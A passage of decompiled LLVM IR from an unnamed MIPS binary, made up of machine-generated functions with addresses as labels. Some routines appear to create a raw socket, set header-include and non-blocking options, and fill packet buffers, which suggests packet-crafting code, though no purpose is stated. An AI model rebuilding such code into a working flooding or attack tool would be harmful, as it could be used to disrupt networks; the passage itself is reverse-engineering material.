  %v2_402ec4 = or i32 %v1_402ec0, %v4_402ebc
  %v0_402ea0.pre = load i32, i32* %a3.global-to-local, align 4
  %extract.t28 = trunc i32 %v0_402ea0.pre to i8
  br label %dec_label_pc_402ea0

dec_label_pc_402ea0:                              ; preds = %dec_label_pc_402eb4, %dec_label_pc_402e88
  %v2_402ea0 = phi i32 [ %v1_402ea8, %dec_label_pc_402eb4 ], [ %v2_402e8c, %dec_label_pc_402e88 ]
  %v0_402ea0.off0 = phi i8 [ %v3_402ea8, %dec_label_pc_402eb4 ], [ %extract.t28, %dec_label_pc_402e88 ]
  %v3_402ea0 = add i32 %v2_402ea0, -1
  %v4_402ea0 = inttoptr i32 %v3_402ea0 to i8*
  store i8 %v0_402ea0.off0, i8* %v4_402ea0, align 1
  %v0_402ea4 = load i32, i32* %a2.global-to-local, align 4
  %v1_402ea4 = add i32 %v0_402ea4, 1
  store i32 %v1_402ea4, i32* %a2.global-to-local, align 4
  %v0_402ea8 = load i32, i32* %a0.global-to-local, align 4
  %v1_402ea8 = add i32 %v0_402ea8, 1
  %v2_402ea8 = inttoptr i32 %v1_402ea8 to i8*
  %v3_402ea8 = load i8, i8* %v2_402ea8, align 1
  %v4_402ea8 = sext i8 %v3_402ea8 to i32
  store i32 %v4_402ea8, i32* @a3, align 4
  %v1_402eb0 = icmp eq i8 %v3_402ea8, 0
  store i32 %v1_402ea8, i32* %a0.global-to-local, align 4
  br i1 %v1_402eb0, label %dec_label_pc_402ed4, label %dec_label_pc_402eb4

dec_label_pc_402eb4:                              ; preds = %dec_label_pc_402ea0
  store i32 %v1_402ec0, i32* %v1.global-to-local, align 4
  %v2_402ec8 = icmp slt i32 %v1_402ea4, %v2_402ec4
  %v3_402ec8 = zext i1 %v2_402ec8 to i32
  store i32 %v3_402ec8, i32* %v0.global-to-local, align 4
  br i1 %v2_402ec8, label %dec_label_pc_402ea0, label %dec_label_pc_402ed4

dec_label_pc_402ed4:                              ; preds = %dec_label_pc_402eb4, %dec_label_pc_402ea0
  %v0_402ed4 = load i32, i32* %a1.global-to-local, align 4
  %v2_402ed4 = add i32 %v0_402ed4, %v1_402ea4
  store i32 %v2_402ed4, i32* @v0, align 4
  %v1_402edc = inttoptr i32 %v2_402ed4 to i8*
  store i8 0, i8* %v1_402edc, align 1
  %v0_402ee0 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v0_402ee0, i32* %a0.global-to-local, align 4
  %v1_402ee4 = load i32, i32* %a2.global-to-local, align 4
  %v2_402ee4 = trunc i32 %v1_402ee4 to i8
  %v4_402ee4 = add i32 %v0_402ee0, 261
  %v5_402ee4 = inttoptr i32 %v4_402ee4 to i8*
  store i8 %v2_402ee4, i8* %v5_402ee4, align 1
  %v6_402ee4 = call i32 @function_404258()
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  %v0_402ef0 = load i32, i32* %s6.global-to-local, align 4
  %v1_402ef0 = trunc i32 %v0_402ef0 to i8
  %v2_402ef0 = load i32, i32* %s3.global-to-local, align 4
  %v3_402ef0 = add i32 %v2_402ef0, 260
  %v4_402ef0 = inttoptr i32 %v3_402ef0 to i8*
  store i8 %v1_402ef0, i8* %v4_402ef0, align 1
  %v2_402ef4 = load i8, i8* %stack_var_-2075, align 1
  %v3_402ef430 = zext i8 %v2_402ef4 to i16
  %v4_402ef8 = zext i8 %tmp32 to i16
  %v1_402efc = mul nuw i16 %v3_402ef430, 256
  %v2_402f00 = or i16 %v1_402efc, %v4_402ef8
  %v2_402f04 = load i32, i32* %s3.global-to-local, align 4
  %v3_402f04 = add i32 %v2_402f04, 256
  %v4_402f04 = inttoptr i32 %v3_402f04 to i16*
  store i16 %v2_402f00, i16* %v4_402f04, align 2
  %v4_402f08 = zext i8 %tmp31 to i32
  %v4_402f0c = zext i8 %tmp to i32
  %v1_402f10 = mul nuw nsw i32 %v4_402f08, 256
  store i32 %v1_402f10, i32* %v0.global-to-local, align 4
  %v2_402f14 = or i32 %v1_402f10, %v4_402f0c
  store i32 %v2_402f14, i32* %v1.global-to-local, align 4
  %v1_402f1c = trunc i32 %v2_402f14 to i16
  %v2_402f1c = load i32, i32* %s3.global-to-local, align 4
  %v3_402f1c = add i32 %v2_402f1c, 258
  %v4_402f1c = inttoptr i32 %v3_402f1c to i16*
  store i16 %v1_402f1c, i16* %v4_402f1c, align 2
  %v0_402f58.pre.pre.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_402f20

dec_label_pc_402f20:                              ; preds = %dec_label_pc_402dc4, %dec_label_pc_402ed4
  %v0_402f58.pre.pre = phi i32 [ %v2_402a84, %dec_label_pc_402dc4 ], [ %v0_402f58.pre.pre.pre, %dec_label_pc_402ed4 ]
  %v0_402f20 = load i32, i32* %s6.global-to-local, align 4
  %v1_402f20 = add i32 %v0_402f20, 1
  store i32 %v1_402f20, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402f24

dec_label_pc_402f24:                              ; preds = %dec_label_pc_402df8, %dec_label_pc_402de8, %dec_label_pc_402d74, %dec_label_pc_402d5c, %dec_label_pc_402d54, %dec_label_pc_402f20
  %v0_402f58.pre = phi i32 [ %v2_402a84, %dec_label_pc_402df8 ], [ %v2_402a84, %dec_label_pc_402de8 ], [ %v2_402a84, %dec_label_pc_402d74 ], [ %v2_402a84, %dec_label_pc_402d5c ], [ %v2_402a84, %dec_label_pc_402d54 ], [ %v0_402f58.pre.pre, %dec_label_pc_402f20 ]
  %v0_402f24 = phi i32 [ %v3_402df4, %dec_label_pc_402df8 ], [ %v3_402df4, %dec_label_pc_402de8 ], [ %v3_402dc0, %dec_label_pc_402d74 ], [ %v3_402d58, %dec_label_pc_402d5c ], [ %v3_402d58, %dec_label_pc_402d54 ], [ %v1_402f20, %dec_label_pc_402f20 ]
  %v1_402f24 = urem i32 %v0_402f24, 65536
  store i32 %v1_402f24, i32* %s6.global-to-local, align 4
  store i32 11, i32* %v0.global-to-local, align 4
  %v2_402f2c = icmp eq i32 %v1_402f24, 11
  br i1 %v2_402f2c, label %dec_label_pc_402f58, label %dec_label_pc_402f3c

dec_label_pc_402f3c:                              ; preds = %dec_label_pc_402f24, %dec_label_pc_402cf8
  %v0_402f3c = phi i32 [ %v2_402a84, %dec_label_pc_402cf8 ], [ %v0_402f58.pre, %dec_label_pc_402f24 ]
  %v1_402f3c = add i32 %v0_402f3c, -32580
  %v2_402f3c = inttoptr i32 %v1_402f3c to i32*
  %v3_402f3c = load i32, i32* %v2_402f3c, align 4
  %v1_402f44 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_402f44, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402f3c)
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  %v0_402f54 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v0_402f54, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_402f58

dec_label_pc_402f58:                              ; preds = %dec_label_pc_402f24, %dec_label_pc_402f3c
  %v0_402f58 = phi i32 [ %v2_402a84, %dec_label_pc_402f3c ], [ %v0_402f58.pre, %dec_label_pc_402f24 ]
  %v1_402f58 = add i32 %v0_402f58, -32580
  %v2_402f58 = inttoptr i32 %v1_402f58 to i32*
  %v3_402f58 = load i32, i32* %v2_402f58, align 4
  %v1_402f60 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_402f60, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_402f58)
  store i32 %v2_402a84, i32* %gp.global-to-local, align 4
  store i32 0, i32* %v0.global-to-local, align 4
  store i32 %v0_402a90, i32* @fp, align 4
  store i32 %v0_402ab0, i32* @s0, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_402f24, { 1, 0 }
  uselistorder i32 %v1_402f10, { 1, 0 }
  uselistorder i8 %v3_402ea8, { 1, 2, 0 }
  uselistorder i32 %v1_402ea8, { 0, 2, 1 }
  uselistorder i32 %v4_402e84, { 1, 0 }
  uselistorder i32 %v0_402e80, { 0, 2, 1 }
  uselistorder i32 %v1_402e44, { 1, 0 }
  uselistorder i32 %v0_402e74, { 1, 0 }
  uselistorder i32 %v5_402de4, { 0, 1, 3, 2 }
  uselistorder i32 %v2_402dcc, { 1, 0, 2 }
  uselistorder i32 %v1_402d0c, { 1, 0 }
  uselistorder i32 %v1_402d00, { 1, 0 }
  uselistorder i32 %v0_402cfc, { 1, 0 }
  uselistorder i32 %v1_402cf0, { 1, 2, 0 }
  uselistorder i32 %v4_402c44, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_402c18, { 1, 0, 2 }
  uselistorder i32 %v1_402abc, { 2, 1, 0 }
  uselistorder i32 %v4_402b6c, { 1, 0 }
  uselistorder i32 %v1_402b64, { 0, 2, 3, 1 }
  uselistorder i32 %v1_402b58, { 1, 0 }
  uselistorder i32 %v1_402b4c, { 0, 2, 1 }
  uselistorder i32 %v2_402b08, { 1, 0 }
  uselistorder i32 %v3_402afc, { 4, 3, 2, 5, 1, 6, 7, 0, 8, 9 }
  uselistorder i32 %v2_402a84, { 20, 7, 19, 6, 1, 2, 3, 4, 5, 0, 25, 24, 23, 22, 21, 18, 17, 16, 15, 27, 26, 14, 28, 13, 12, 11, 10, 9, 8, 29 }
  uselistorder i32* %stack_var_-4288, { 0, 2, 1 }
  uselistorder i16* %stack_var_-2096, { 2, 0, 1 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 28, 26, 27, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %a3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %a1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0 }
  uselistorder i8 1, { 0, 1, 3, 2 }
  uselistorder i32 2048, { 1, 2, 0 }
  uselistorder i32 46, { 0, 2, 1 }
  uselistorder label %dec_label_pc_402f58, { 1, 0 }
  uselistorder label %dec_label_pc_402f24, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_402f20, { 1, 0 }
  uselistorder label %dec_label_pc_402e6c, { 1, 0 }
  uselistorder label %dec_label_pc_402cb4, { 1, 0 }
  uselistorder label %dec_label_pc_402c38, { 1, 0 }
}

define i32 @function_402fa4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402fa4:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_402fb0 = load i32, i32* bitcast (i32** @global_var_44935c.229 to i32*), align 4
  store i32 %v3_402fb0, i32* %v0.global-to-local, align 4
  %v3_402fb4 = load i32, i32* @global_var_4493e4.7, align 4
  store i32 %v3_402fb4, i32* @t9, align 4
  store i32 %v3_402fb0, i32* %a0.global-to-local, align 4
  store i32 9, i32* %a1.global-to-local, align 4
  %v5_402fbc = call i32 @function_404b50(i32 %v3_402fb0, i32 9)
  store i32 %v5_402fbc, i32* %v0.global-to-local, align 4
  %v1_402fcc = load i32, i32* @t9, align 4
  %v1_402fd0 = urem i32 %arg1, 65536
  %v1_402fd4 = add i32 %v1_402fcc, 287924
  %v2_402fd4 = inttoptr i32 %v1_402fd4 to i32*
  %v3_402fd4 = load i32, i32* %v2_402fd4, align 4
  store i8 9, i8* bitcast (i32* @global_var_44936c.20 to i8*), align 4
  store i32 %v1_402fd0, i32* @global_var_449368.230, align 4
  store i16 0, i16* bitcast (i32* @global_var_44956e.231 to i16*), align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_44936e.232 to i32), i32* %a0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_402fd4)
  %v0_403008 = load i32, i32* @s1, align 4
  %v0_40300c = load i32, i32* @s0, align 4
  %v3_403014 = load i32, i32* @global_var_449376.233, align 4
  store i32 %v3_403014, i32* %v0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_44936e.232 to i32), i32* %s0.global-to-local, align 4
  store i32 -1, i32* %s1.global-to-local, align 4
  %v1_403020 = add i32 %v3_402fd4, 287384
  %v2_403020 = inttoptr i32 %v1_403020 to i32*
  %v3_403020 = load i32, i32* %v2_403020, align 4
  store i32 %v3_403014, i32* %a0.global-to-local, align 4
  %v0_403028 = load i32, i32* %a1.global-to-local, align 4
  %v1_403028 = trunc i32 %v0_403028 to i8
  store i8 %v1_403028, i8* bitcast (i32* @global_var_44937e.234 to i8*), align 4
  %v2_40302c = icmp eq i32 %v3_403014, -1
  store i8 0, i8* bitcast (i32* @global_var_44937f.235 to i8*), align 4
  br i1 %v2_40302c, label %dec_label_pc_403040, label %dec_label_pc_403030

dec_label_pc_403030:                              ; preds = %dec_label_pc_402fa4
  call void @__pseudo_call(i32 %v3_403020)
  %v0_403040.pre = load i32, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_403040

dec_label_pc_403040:                              ; preds = %dec_label_pc_402fa4, %dec_label_pc_403030
  %v0_403040 = phi i32 [ -1, %dec_label_pc_402fa4 ], [ %v0_403040.pre, %dec_label_pc_403030 ]
  store i32 %v0_403040, i32* @global_var_449376.233, align 4
  store i32 0, i32* @global_var_44937a.237, align 4
  store i16 0, i16* bitcast (i32* @global_var_449580.238 to i16*), align 4
  store i32 0, i32* @global_var_449582.239, align 4
  %v1_403050 = add i32 %v3_402fd4, 287876
  %v2_403050 = inttoptr i32 %v1_403050 to i32*
  %v3_403050 = load i32, i32* %v2_403050, align 4
  store i32 ptrtoint (i32* @global_var_449380.4 to i32), i32* %a0.global-to-local, align 4
  store i32 %v0_403008, i32* %s1.global-to-local, align 4
  store i32 %v0_40300c, i32* %s0.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_403050)
  %v2_40307c = add i32 %v3_403050, 319836
  store i32 %v2_40307c, i32* %stack_var_-40, align 4
  %v1_403094 = add i32 %v3_403050, 287696
  %v2_403094 = inttoptr i32 %v1_403094 to i32*
  %v3_403094 = load i32, i32* %v2_403094, align 4
  %v0_403098 = load i32, i32* %a0.global-to-local, align 4
  store i32 %v0_403098, i32* %s1.global-to-local, align 4
  store i32 2, i32* %a1.global-to-local, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_403094)
  %v3_4030ac = load i32, i32* %stack_var_-40, align 4
  %v0_4030b0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4030b0, i32* %s0.global-to-local, align 4
  store i32 %v0_4030b0, i32* %a0.global-to-local, align 4
  store i32 %v0_4030b0, i32* @global_var_449388.59, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v1_4030c0 = add i32 %v3_4030ac, -32572
  %v2_4030c0 = inttoptr i32 %v1_4030c0 to i32*
  %v3_4030c0 = load i32, i32* %v2_4030c0, align 4
  store i32 3, i32* %a1.global-to-local, align 4
  %v2_4030c8 = icmp eq i32 %v0_4030b0, -1
  br i1 %v2_4030c8, label %dec_label_pc_403148, label %dec_label_pc_4030cc

dec_label_pc_4030cc:                              ; preds = %dec_label_pc_403040
  store i32 2, i32* %v0.global-to-local, align 4
  store i32 2, i32* %stack_var_-32, align 4
  call void @__pseudo_call(i32 %v3_4030c0)
  %v3_4030ec = load i32, i32* %stack_var_-40, align 4
  %v0_4030f0 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_4030f0, i32* %a0.global-to-local, align 4
  %v1_4030f4 = add i32 %v3_4030ec, -32572
  %v2_4030f4 = inttoptr i32 %v1_4030f4 to i32*
  %v3_4030f4 = load i32, i32* %v2_4030f4, align 4
  store i32 4, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4030f4)
  %v3_403104 = load i32, i32* %stack_var_-40, align 4
  %v0_403108 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_403108, i32* %a0.global-to-local, align 4
  %v1_40310c = add i32 %v3_403104, -32736
  %v2_40310c = inttoptr i32 %v1_40310c to i32*
  %v3_40310c = load i32, i32* %v2_40310c, align 4
  store i32 1, i32* %a1.global-to-local, align 4
  %v1_403114 = add i32 %v3_40310c, 12228
  call void @__pseudo_call(i32 %v1_403114)
  %v3_403120 = load i32, i32* %stack_var_-40, align 4
  %v3_403124 = load i32, i32* @global_var_449388.59, align 4
  store i32 %v3_403124, i32* %a0.global-to-local, align 4
  %v1_403128 = add i32 %v3_403120, -32020
  %v2_403128 = inttoptr i32 %v1_403128 to i32*
  %v3_403128 = load i32, i32* %v2_403128, align 4
  store i32 %v3_403128, i32* %v0.global-to-local, align 4
  %v1_40312c = add i32 %v3_403120, -32040
  %v2_40312c = inttoptr i32 %v1_40312c to i32*
  %v3_40312c = load i32, i32* %v2_40312c, align 4
  %v1_403130 = inttoptr i32 %v3_403128 to i32*
  %v2_403130 = load i32, i32* %v1_403130, align 4
  store i32 %v2_403130, i32* %v0.global-to-local, align 4
  %v2_403134 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_403134, i32* %a1.global-to-local, align 4
  store i32 %v2_403130, i32* @global_var_449594.245, align 4
  call void @__pseudo_call(i32 %v3_40312c)
  br label %dec_label_pc_403148

dec_label_pc_403148:                              ; preds = %dec_label_pc_403040, %dec_label_pc_4030cc
  %v4_403154 = phi i32 [ -1, %dec_label_pc_403040 ], [ %v2_403130, %dec_label_pc_4030cc ]
  store i32 %v0_403008, i32* %s1.global-to-local, align 4
  store i32 %v0_40300c, i32* %s0.global-to-local, align 4
  ret i32 %v4_403154

; uselistorder directives
  uselistorder i32 %v3_403050, { 0, 2, 1 }
  uselistorder i32 %v3_403014, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder label %dec_label_pc_403148, { 1, 0 }
  uselistorder label %dec_label_pc_403040, { 1, 0 }
}

define i32 @function_40315c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40315c:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %a3.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %s3.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i16 @__decompiler_undefined_function_2()
  %tmp59 = call i8 @__decompiler_undefined_function_1()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %tmp73 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-2920 = alloca i32, align 4
  %stack_var_-2924 = alloca i32, align 4
  %stack_var_-2916 = alloca i32, align 4
  %stack_var_-2596 = alloca i32, align 4
  %stack_var_-2724 = alloca i32, align 4
  %stack_var_-2852 = alloca i32, align 4
  %stack_var_-1572 = alloca i32, align 4
  %stack_var_-2908 = alloca i32, align 4
  %stack_var_-2872 = alloca i16, align 2
  %stack_var_-2928 = alloca i32, align 4
  %stack_var_-2892 = alloca i32, align 4
  %v1_403164 = load i32, i32* @t9, align 4
  %v2_403164 = add i32 %v1_403164, 319604
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v0_40316c = load i32, i32* @ra, align 4
  %v0_403170 = load i32, i32* @fp, align 4
  %v0_403174 = load i32, i32* @s7, align 4
  %v0_403178 = load i32, i32* @s6, align 4
  %v0_403180 = load i32, i32* @s4, align 4
  %v0_403190 = load i32, i32* @s0, align 4
  %v3_403198 = load i32, i32* @global_var_449380.4, align 4
  store i32 %v3_403198, i32* @t9, align 4
  %v2_4031a0 = urem i32 %arg1, 256
  store i32 %v2_4031a0, i32* @s7, align 4
  %v3_4031a0 = call i32 @function_404a30()
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v3_4031a0, i32* %v1.global-to-local, align 4
  %v3_4031b0 = load i32, i32* bitcast (i32** @global_var_44935c.229 to i32*), align 4
  store i32 %v3_4031b0, i32* %v0.global-to-local, align 4
  %v1_4031b4 = icmp sgt i32 %v3_4031a0, 0
  %v4_4031b4 = inttoptr i32 %v3_4031b0 to i32*
  store i32 %v3_4031a0, i32* %v4_4031b4, align 4
  br i1 %v1_4031b4, label %dec_label_pc_403f98, label %dec_label_pc_4031b8

dec_label_pc_4031b8:                              ; preds = %dec_label_pc_40315c
  store i32 -1, i32* @s0, align 4
  %v0_4031c0 = load i32, i32* %v1.global-to-local, align 4
  %v2_4031c0 = icmp eq i32 %v0_4031c0, -1
  br i1 %v2_4031c0, label %dec_label_pc_403f98, label %dec_label_pc_4031c4

dec_label_pc_4031c4:                              ; preds = %dec_label_pc_4031b8
  %v3_4031c8 = load i32, i32* @global_var_4493a8.167, align 4
  store i32 %v3_4031c8, i32* @t9, align 4
  %v1_4031d0 = call i32 @function_4029cc()
  store i32 %v1_4031d0, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_4031e0 = load i32, i32* @global_var_449414.190, align 4
  store i32 %v3_4031e0, i32* @t9, align 4
  store i32 0, i32* %stack_var_-2928, align 4
  %v4_4031e8 = call i32 @function_4028bc()
  store i32 %v4_4031e8, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 40, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v3_403200 = ptrtoint i32* %stack_var_-2892 to i32
  store i32 %v3_403200, i32* %a0.global-to-local, align 4
  %v8_403200 = call i32 @function_405520(i32* nonnull %stack_var_-2892, i32 0, i32 40)
  store i32 %v8_403200, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403210 = load i32, i32* @global_var_449340.219, align 4
  store i32 %v3_403210, i32* @t9, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  %v3_403218 = call i32 @function_404fa0(i32* null)
  store i32 %v3_403218, i32* @v0, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 160, i32* %a0.global-to-local, align 4
  %v3_403228 = load i32, i32* bitcast (i32** @global_var_4494bc.248 to i32*), align 4
  store i32 %v3_403228, i32* %v1.global-to-local, align 4
  %v3_40322c = load i32, i32* @global_var_4493f0.14, align 4
  store i32 %v3_40322c, i32* @t9, align 4
  %v2_403230 = inttoptr i32 %v3_403228 to i32*
  store i32 %v3_403218, i32* %v2_403230, align 4
  store i32 536, i32* %a1.global-to-local, align 4
  %v4_403234 = call i32 @function_405e80(i64 160, i32 536)
  store i32 %v4_403234, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 2, i32* %a0.global-to-local, align 4
  %v3_403244 = load i32, i32* @global_var_449444.201, align 4
  store i32 %v3_403244, i32* @t9, align 4
  store i32 3, i32* %a1.global-to-local, align 4
  store i32 6, i32* @a2, align 4
  store i32 %v4_403234, i32* @s6, align 4
  %v5_403250 = call i32 @function_405aa0(i32 2, i32 3)
  store i32 %v5_403250, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v1_40325c = load i32, i32* @s0, align 4
  %v2_40325c = icmp eq i32 %v5_403250, %v1_40325c
  store i32 %v5_403250, i32* @s4, align 4
  br i1 %v2_40325c, label %dec_label_pc_4032e0, label %dec_label_pc_403260

dec_label_pc_403260:                              ; preds = %dec_label_pc_4031c4
  %v3_403264 = load i32, i32* @global_var_449294.203, align 4
  store i32 %v3_403264, i32* @t9, align 4
  store i32 3, i32* @a1, align 4
  store i32 0, i32* %a2.global-to-local, align 4
  store i32 %v5_403250, i32* @a0, align 4
  %v2_403270 = call i32 @function_404870()
  store i32 %v2_403270, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v0_40327c = load i32, i32* @s4, align 4
  store i32 %v0_40327c, i32* @a0, align 4
  %v3_403280 = load i32, i32* @global_var_449294.203, align 4
  store i32 %v3_403280, i32* @t9, align 4
  %v1_403284 = or i32 %v2_403270, 128
  store i32 %v1_403284, i32* %a2.global-to-local, align 4
  store i32 4, i32* @a1, align 4
  %v1_403288 = call i32 @function_404870()
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403298 = load i32, i32* @global_var_4493bc.249, align 4
  store i32 %v3_403298, i32* @t9, align 4
  store i32 1, i32* %stack_var_-2928, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  %v0_4032a8 = load i32, i32* @s4, align 4
  store i32 %v0_4032a8, i32* %a0.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 3, i32* %a2.global-to-local, align 4
  %v3_4032b4 = ptrtoint i32* %stack_var_-2928 to i32
  store i32 %v3_4032b4, i32* %a3.global-to-local, align 4
  %v10_4032b4 = call i32 @function_405a20(i32 %v0_4032a8, i32 0, i32 3, i32* nonnull %stack_var_-2928, i32 4)
  store i32 %v10_4032b4, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v1_4032c0 = icmp eq i32 %v10_4032b4, 0
  br i1 %v1_4032c0, label %dec_label_pc_4032f0, label %dec_label_pc_4032c4

dec_label_pc_4032c4:                              ; preds = %dec_label_pc_403260
  %v3_4032c8 = load i32, i32* @global_var_44928c.150, align 4
  store i32 %v3_4032c8, i32* @t9, align 4
  %v1_4032d0 = load i32, i32* @s4, align 4
  store i32 %v1_4032d0, i32* %a0.global-to-local, align 4
  %v3_4032d0 = call i32 @function_4049d0(i32 %v1_4032d0)
  store i32 %v3_4032d0, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4032e0

dec_label_pc_4032e0:                              ; preds = %dec_label_pc_4033c0, %dec_label_pc_4031c4, %dec_label_pc_4032c4
  %v1_4032e0 = add i32 %v1_403164, 287104
  %v2_4032e0 = inttoptr i32 %v1_4032e0 to i32*
  %v3_4032e0 = load i32, i32* %v2_4032e0, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4032e0)
  %v0_4032f0.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4032f0

dec_label_pc_4032f0:                              ; preds = %dec_label_pc_403260, %dec_label_pc_4032e0
  %v0_4032f0 = phi i32 [ %v2_403164, %dec_label_pc_403260 ], [ %v0_4032f0.pre, %dec_label_pc_4032e0 ]
  %v1_4032f0 = add i32 %v0_4032f0, -32420
  %v2_4032f0 = inttoptr i32 %v1_4032f0 to i32*
  %v3_4032f0 = load i32, i32* %v2_4032f0, align 4
  store i32 ptrtoint (i32* @global_var_403300.251 to i32), i32* @ra, align 4
  store i32 27, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4032f0)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403308 = load i32, i32* @global_var_449480.175, align 4
  store i32 %v3_403308, i32* @t9, align 4
  store i32 27, i32* %a0.global-to-local, align 4
  %v2_403310 = call i32 @function_400f0c(i32 27)
  store i32 %v2_403310, i32* @v0, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_403310, i32* %a0.global-to-local, align 4
  %v3_403320 = load i32, i32* @global_var_4493d4.199, align 4
  store i32 %v3_403320, i32* @t9, align 4
  store i32 16, i32* %a1.global-to-local, align 4
  %v3_403328 = call i32 @function_402a7c(i32 %v2_403310, i32 16)
  store i32 %v3_403328, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403338 = load i32, i32* @global_var_449404.178, align 4
  store i32 %v3_403338, i32* @t9, align 4
  %v1_40333c = icmp eq i32 %v3_403328, 0
  store i32 %v3_403328, i32* @fp, align 4
  br i1 %v1_40333c, label %dec_label_pc_403340, label %dec_label_pc_403360

dec_label_pc_403340:                              ; preds = %dec_label_pc_4032f0
  store i32 26, i32* %a0.global-to-local, align 4
  %v2_403344 = call i32 @function_400dc0(i32 26)
  store i32 %v2_403344, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403354 = load i32, i32* @global_var_449284.12, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403360

dec_label_pc_403360:                              ; preds = %dec_label_pc_4032f0, %dec_label_pc_403340
  %v0_403360 = phi i32 [ %v3_403338, %dec_label_pc_4032f0 ], [ %v3_403354, %dec_label_pc_403340 ]
  store i32 ptrtoint (i32* @global_var_403368.252 to i32), i32* @ra, align 4
  store i32 27, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_403360)
  %v0_403368 = load i32, i32* @fp, align 4
  %v1_403368 = add i32 %v0_403368, 261
  %v2_403368 = inttoptr i32 %v1_403368 to i8*
  %v3_403368 = load i8, i8* %v2_403368, align 1
  %v4_403368 = zext i8 %v3_403368 to i32
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v1_403370 = add nuw nsw i32 %v4_403368, 254
